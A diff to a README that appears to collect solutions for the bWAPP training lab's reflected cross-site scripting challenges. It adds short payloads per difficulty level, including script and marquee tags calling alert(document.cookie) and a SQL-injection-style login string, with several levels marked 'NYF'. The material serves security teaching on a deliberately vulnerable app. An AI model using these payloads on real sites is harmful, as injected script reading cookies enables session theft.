@@ -55,3 +55,32 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 
 # XSS - Reflected (CustomHeader)(Medium)
 ```Payload – bWAPP:<marquee onclick=alert(document.cookie)>click to win 1$</marquee>```
+
+# XSS - Reflected (CustomHeader)(High)
+```Paylaod - NYF```
+
+# XSS - Reflected (EVAL)(Low)
+```Payload – Date=alert(Document.cookie)```
+
+# XSS - Reflected (EVAL)(Medium)
+```Payload – Date=alert(document.cookie)```
+
+# XSS - Reflected (EVAL)(High)
+```Payload – NYF```
+
+# XSS - Reflected (HREF)(Low)
+```Payload - <marquee onclick=alert(document.cookie)>click to win 1$</marquee>```
+
+# XSS - Reflected (HREF)(Medium)
+```Payload - NYF```
+
+# XSS - Reflected (HREF)(High)
+```Payload – NYF```
+
+# XSS - Reflected (Login Form)(Low)
+```Payload – ‘ or 1=1; <script>alert(document.cookie)</script>```
+
+
+
+
+
